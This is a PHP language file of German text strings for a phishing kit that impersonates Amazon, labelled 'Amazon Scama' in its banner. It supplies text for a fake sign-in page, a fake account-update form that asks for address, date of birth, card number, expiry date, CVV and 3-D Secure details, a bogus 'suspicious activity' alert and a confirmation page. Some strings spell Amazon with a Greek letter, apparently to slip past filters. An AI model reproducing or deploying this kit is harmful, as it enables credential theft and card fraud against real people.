<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
/* ---------------------------------- LOGIN LANG ------------ ------------------------- */
$_LANG['TITLEPAGE'] = "Amazon Anmelden";
$_LANG['NEW'] = "Neu bei Amazon?";
$_LANG['SIGNUP'] = "Erstelle dein Amazon-Konto";
$_LANG['TITLESIGNIN1'] = "Anmelden";
$_LANG['TITLESIGNIN2'] = "E-Mail (Telefon für mobile Konten)";
$_LANG['TITLEFAIL'] = "Geben Sie Ihre E-Mail-Adresse oder Handynummer ein";
$_LANG['CONTINUE'] = "Weiter";
$_LANG['HELP'] = "Brauchen Sie Hilfe?";
$_LANG['FORGOT'] = "Passwort vergessen?";
$_LANG['OTHER'] = "Andere Probleme bei der Anmeldung";
$_LANG['CHANGE'] = "Ändern";
$_LANG['TITLEPASSWORD'] = "Passwort";
$_LANG['PASSWORD'] = "Gib dein Passwort ein";
$_LANG['TITLEKEEP'] = "Halte mich angemeldet.";
$_LANG['CHECKKEEP'] = "Checkbox";
$_LANG['HINWEISKEEP'] = "Halte mich angemeldet";
$_LANG['HINWEISKEEP1'] = "Wenn Sie \" Bleiben Sie bei mir angemeldet \ wählen, reduziert sich die Anzahl der Anmeldeversuche auf diesem Gerät.";
$_LANG['HINWEISKEEP2'] = "Damit Ihr Konto sicher bleibt";
$_LANG['HINWEISKEEP3'] = "verwende diese Option nur auf deinen persönlichen Geräten.";
$_LANG['DETAIL'] = "Details";
$_LANG['FOOT'] = "Nutzungsbedingungen";
$_LANG['FOOT1'] = "Datenschutzhinweis";
$_LANG['FOOT2'] = "Hilfe";
$_LANG['FOOT3'] = "© 1996- <script> document.write (neues Datum (). GetFullYear ()); </ script>, Αmazon.com, Inc. oder seine verbundenen Unternehmen";
$_LANG['FOOT4'] = "Interest-Based Ads";
$_LANG['FOOT5'] = "Zurück nach oben";
$_LANG['FOOT6'] = "Lerne uns kennen";
$_LANG['FOOT7'] = "Karrieren";
$_LANG['FOOT8'] = "Blog";
$_LANG['FOOT9'] = "Über Amazon";
$_LANG['FOOT10'] = "Investor Relations";
$_LANG['FOOT11'] = "Amazon Devices";
$_LANG['FOOT12'] = "Verdiene Geld mit uns";
$_LANG['FOOT13'] = "Verkauf bei Amazon";
$_LANG['FOOT14'] = "Verkaufe deine Dienste auf Amazon";
$_LANG['FOOT15'] = "Verkaufen bei Amazon Business";
$_LANG['FOOT16'] = "Verkaufe deine Apps auf Amazon";
$_LANG['FOOT17'] = "Werde ein Affiliate";
$_LANG['FOOT18'] = "Werben Sie Ihre Produkte";
$_LANG['FOOT19'] = "Mit uns selbst veröffentlichen";
$_LANG['FOOT20'] = "Alle anzeigen";
$_LANG['FOOT21'] = "Amazon Zahlungsprodukte";
$_LANG['FOOT22'] = "Amazon Rewards Visa Signaturkarten";
$_LANG['FOOT23'] = "Amazon.com Store Card";
$_LANG['FOOT24'] = "Amazon.com Corporate Credit Line";
$_LANG['FOOT25'] = "Shop mit Punkten";
$_LANG['FOOT26'] = "Kreditkarten-Marktplatz";
$_LANG['FOOT27'] = "Lade dein Guthaben neu";
$_LANG['FOOT28'] = "Amazon Currency Converter";
$_LANG['FOOT29'] = "Lass uns dir helfen";
$_LANG['FOOT30'] = "Dein Konto";
$_LANG['FOOT31'] = "Deine Befehle";
$_LANG['FOOT32'] = "Versandkosten & Richtlinien";
$_LANG['FOOT33'] = "Amazon Prime";
$_LANG['FOOT34'] = "Rückgabe und Ersatz";
$_LANG['FOOT35'] = "Verwalten Sie Ihre Inhalte und Geräte";
/* ---------------------------------- LOGIN ALARM ------------ ------------------------- */
$_LANG['TITLEALERT'] = "Es gab ein Problem";
$_LANG['ALERT'] = "Bitte geben Sie Ihre E-Mail-Adresse oder Handynummer an";
$_LANG['ALERT1'] = "Ungültige E-Mail-Adresse oder Handynummer";
$_LANG['ALERT2'] = "Bitte geben Sie Ihr Passwort ein";
$_LANG['ALERT3'] = "Geben Sie die Zeichen so ein, wie sie in der Aufgabe angegeben sind.";
/* ---------------------------------- UPDATE ALARM ------------ ------------------------- */
$_LANG['UPALERT'] = "Bitte geben Sie eine gültige Adresszeile ein";
$_LANG['UPALERT1'] = "Bitte geben Sie einen gültigen Stadtnamen ein";
$_LANG['UPALERT2'] = "Bitte geben Sie einen gültigen Staat / Provinz / Region Name";
$_LANG['UPALERT3'] = "Bitte geben Sie eine gültige Postleitzahl ein";
$_LANG['UPALERT4'] = "Bitte geben Sie eine gültige Telefonnummer ein";
$_LANG['UPALERT5'] = "Bitte ein gültiges Geburtsdatum eingeben";
$_LANG['UPALERT6'] = "Bitte geben Sie einen gültigen Namen ein";
$_LANG['UPALERT7'] = "Bitte geben Sie eine gültige Kartennummer ein";
$_LANG['UPALERT8'] = "Bitte geben Sie einen gültigen Kartensicherheitscode ein";
$_LANG['UPALERT9'] = "CVV / CVV2";
/* ---------------------------------- HEADER UPDATE ACCOUNT ----------- -------------------------- */
$_LANG['TITLEHEAD'] = "Dein Αmazon Wallet";
$_LANG['HEAD'] = "Try Prime";
$_LANG['HEAD1'] = "Konto & Listen";
$_LANG['HEAD2'] = "Aufträge";
$_LANG['HEAD3'] = "Warenkorb";
$_LANG['HEAD4'] = "Browserverlauf";
$_LANG['HEAD5'] = "Amazon News";
$_LANG['HEAD6'] = "Deals von heute";
$_LANG['HEAD7'] = "Geschenkkarten";
$_LANG['HEAD8'] = "Disability Customer Support";
$_LANG['HEAD9'] = "Dein Konto";
$_LANG['HEAD10'] = "Ihre Adresse";
$_LANG['HEAD11'] = "Adresse bearbeiten";
$_LANG['HEAD12'] = "Bearbeiten Sie Ihre Adresse";
$_LANG['HEAD13'] = "Suche";
$_LANG['HEAD14'] = "Treasure Truck";
$_LANG['HEAD15'] = "Hilfe";
/* ---------------------------------- HEADER UPDATE ACCOUNT ----------- -------------------------- */
$_LANG['TITLEHEADUP'] = "Eine Adresse hinzufügen oder bestätigen";
$_LANG['HEADUP'] = "Geben Sie Ihre persönlichen Informationen ein";
$_LANG['HEADUP1'] = "(Schritt 1 von 2)";
$_LANG['HEADUP2'] = "JavaScript erforderlich";
$_LANG['HEADUP3'] = "Bitte aktivieren Sie JavaScript um diese Seite zu benutzen";
/* ---------------------------------- FORM UPDATE ACCOUNT ----------- -------------------------- */
$_LANG['TITLEUP'] = "Aktualisieren Sie Ihre Adresse";
$_LANG['FRMUP'] = "Vollständiger Name";
$_LANG['FRMUP1'] = "Adresse der Straße";
$_LANG['FRMUP2'] = "Stadt";
$_LANG['FRMUP3'] = "Bundesland / Provinz / Region";
$_LANG['FRMUP4'] = "Postleitzahl";
$_LANG['FRMUP5'] = "Telefonnummer";
$_LANG['FRMUP6'] = "Eine Kredit- / Debitkarte hinzufügen oder bestätigen";
$_LANG['FRMUP7'] = "Name auf Karte";
$_LANG['FRMUP8'] = "Kartennummer";
$_LANG['FRMUP9'] = "Ablaufdatum";
$_LANG['FRMUP10'] = "Kartensicherheitscode";
$_LANG['FRMUP11'] = "Kann zur Unterstützung der Lieferung verwendet werden";
$_LANG['FRMUP12'] = "Αmazon akzeptiert alle gängigen Kredit- und Debitkarten.";
$_LANG['FRMUP13'] = "SecureCode / VBV";
$_LANG['FRMUP14'] = "3D Secure / Verified by Visa";
$_LANG['COUNTRY'] = "Land";
$_LANG['DOB'] = "Geburtsdatum";
$_LANG['TITLEADDRESS1'] = "Adresszeile 1";
$_LANG['TITLEADDRESS2'] = "Adresszeile 2";
$_LANG['ADDRESS1'] = "Straße und Nummer, Postfach, c / o.";
$_LANG['ADDRESS2'] = "Wohnung, Suite, Einheit, Gebäude, Etage, etc.";
$_LANG['TERMS'] = "Αmazon Update Terms";
$_LANG['TERMS1'] = "Wenn Sie auf Speichern und fortfahren klicken, stimmen Sie Αmazon zu.";
$_LANG['TERMS2'] = "Datenschutz und Nutzungsbedingungen.";
$_LANG['SAVE'] = "Speichern & Fortfahren";
/* ---------------------------------- VBV / MSC KREDITKARTE --------- ---------------------------- */
$_LANG['TITLEVBVMSC'] = "3-D Security Auth";
$_LANG['VBVMSCPROCESS'] = "3-D-Sicherheit wurde erfolgreich verarbeitet ...";
$_LANG['VBVMSCLOAD'] = "Verarbeitung";
$_LANG['VBVMSCSAFE'] = "Sicherheit online hinzugefügt";
$_LANG['VBVMSCAUTH1'] = "hilft Ihnen, Ihre Karte gegen unbefugte Benutzung online zu schützen - ohne zusätzliche Kosten.";
$_LANG['VBVMSCAUTH2'] = "Für diese und zukünftige Aufgaben verwenden.";
$_LANG['VBVMSCAUTH3'] = "vervollständige diese Seite Du wirst dein eigenes erstellen.";
$_LANG['VBVMSCNAME'] = "Name auf Karte:";
$_LANG['VBVMSCCOUNTRY'] = "Land:";
$_LANG['VBVMSCTYPE'] = "Kartentyp:";
$_LANG['VBVMSCNUMBER'] = "Kartennummer:";
$_LANG['VBVMSCDATE'] = "Datum Zeit:";
$_LANG['VBVMSCDOB'] = "Geburtsdatum:";
$_LANG['PENCET'] = "Senden";
$_LANG['CAN NOT'] = "Kann nicht auf Ihre zugreifen";
$_LANG['AMAZONCONTACT'] = "Kontakt";
$_LANG['AMAZONCS'] = "Amazon Kundendienst";
$_LANG['AMAZONASS'] = "Amazon Assistent";
/* ---------------------------------- HINWEIS UPDATE ACCOUNT ----------- -------------------------- */
$_LANG['NOTIUP'] = "Durch Klicken auf Zustimmen & Fortfahren habe ich Amazon gelesen und stimme ihm zu";
$_LANG['NOTIUP1'] = "Benutzervereinbarung";
$_LANG['NOTIUP2'] = "Elektronische Kommunikationsaktualisierungsrichtlinie";
$_LANG['NOTIUP3'] = "ΑGree & Continue";
/*---------------------------------- SPRACHE ------------- ------------------------ */
$_LANG['BAHASA1'] = "EN";
$_LANG['BAHASA2'] = "Englisch";
/* ---------------------------------- MAKASIH ------------- ------------------------ */
$_LANG['MAKASIH'] = "Danke";
$_LANG['MAKASIH1'] = "Sie haben Ihre Kontoinformationen erfolgreich bestätigt.";
/* ---------------------------------- HINWEIS MAKASIH ------------ ------------------------- */
$_LANG['NOTICEMAKASIH'] = "Danke,
Sie haben Ihre Kontoinformationen erfolgreich bestätigt. ";
$_LANG['NOTICEMAKASIH1'] = "Bitte überprüfen Sie Ihre E-Mail auf weitere Anweisungen und detaillierte Informationen zu Ihrem Update. Falls Sie Ihre E-Mail-Adresse nicht registriert haben, besuchen Sie bitte <a href='#/gp/message'> Message Center </ a> um Ihre Update-Benachrichtigungen zu überprüfen. ";
$_LANG['NOTICEMAKASIH2'] = "Erhalten Sie Update-Benachrichtigungen auf Ihrem Mobilgerät mit der kostenlosen <a href='#/typapp'> Amazon App </a>.";
$_LANG['NOTICEMAKASIH3'] = "Aktivieren Sie 1-Click update";
$_LANG['HINWEISID'] = "Update ID:";
$_LANG['HINWEISID1'] = "Überprüfen oder bearbeiten Sie Ihr Konto";
$_LANG['NOTICESHOP'] = "Weiter einkaufen";
/* ---------------------------------- AKTIVASI ------------- ------------------------ */
$_LANG['AKTIF'] = "Bestätigen & Aktivieren";

/* ---------------------------------- HINWEIS AKTIVITÄT ------------ ------------------------- */
$_LANG['LOGINALERT'] = "Amazon verdächtige Aktivität erkannt";
$_LANG['LOGINALERT1'] = "Verdächtige Aktivitäten";
$_LANG['LOGINALERT2'] = "Es scheint, dass ein oder mehrere nicht autorisierte Geräte mit Ihrem Konto verbunden sind und Sicherheit mit der Telefonnummer hinzufügen: +1 (8 **) *** 2740.";
$_LANG['LOGINALERT3'] = "Verifikation jetzt starten";
?>